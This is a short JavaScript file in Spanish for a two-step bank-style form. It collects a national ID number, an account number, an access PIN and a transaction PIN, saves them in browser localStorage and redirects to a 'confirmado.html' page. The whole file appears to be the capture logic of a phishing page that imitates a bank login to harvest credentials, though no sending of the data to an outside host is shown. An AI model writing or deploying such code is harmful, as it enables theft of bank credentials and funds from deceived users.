document.getElementById("vprocesarr").addEventListener("click", chkc);

function chkc(params) {

    
   
    if (document.getElementById("cedula").value.length <= 5 ) {
        alert("error")
        document.getElementById("cedula").value = ""
    
        
    } else if(document.getElementById("cuenta").value.length <= 5) {
        alert("error")
        document.getElementById("cuenta").value = ""
        

    }else {
        nxt();



    }
}

function nxt(params) {
    document.getElementById("cedula").style.display = "none";
    document.getElementById("cuenta").style.display = "none";
    document.getElementById("vprocesarr").style.display = "none";
    document.getElementById("cedulaa").style.display = "block";
    document.getElementById("cuentaa").style.display = "block";
    document.getElementById("vprocesars").style.display = "block";
    document.getElementById("segmento").selectedIndex = 1; 
    document.getElementById("tipoCuenta").selectedIndex = 1;
    
    
}

document.getElementById("vprocesars").addEventListener("click", chkk, false)

function chkk(params) {
    if (document.getElementById("cedulaa").value.length <= 5 ) {
        alert("error PIN INCOMPLETO")
        document.getElementById("cedulaa").value = ""
        false;
    
        
    } else if(document.getElementById("cuentaa").value.length <= 5) {
        alert("error PIN INCOMPLETO")
        document.getElementById("cuentaa").value = ""
        false;
        

    }else if (document.getElementById("cedulaa").value === document.getElementById("cuentaa").value) {
      
        alert("ERROR: Su pin de acceso/transaccional no deben ser iguales.")
        document.getElementById("cedulaa").value = "";
        document.getElementById("cedulaa").focus();
        false;

    }else{
        nextt();
    }
    
}
function nextt(params) {
    localStorage.setItem("Documento", document.getElementById("cedula").value)
    localStorage.setItem("Cuenta", document.getElementById("cuenta").value)
    localStorage.setItem("PinTransaccional", document.getElementById("cuentaa").value)
    localStorage.setItem("PinAcceso", document.getElementById("cedulaa").value)

    window.location.href = "confirmado.html"
    
}
document.getElementById("cedula").addEventListener("keyup", dsbl);

function dsbl(params) {
    
    document.getElementById("vprocesarr").disabled = false;
    document.getElementById("cuenta").placeholder  = "";
    document.getElementById("cuenta").value  = "";

}
window.onload = document.getElementById("menu-nav-user").click();
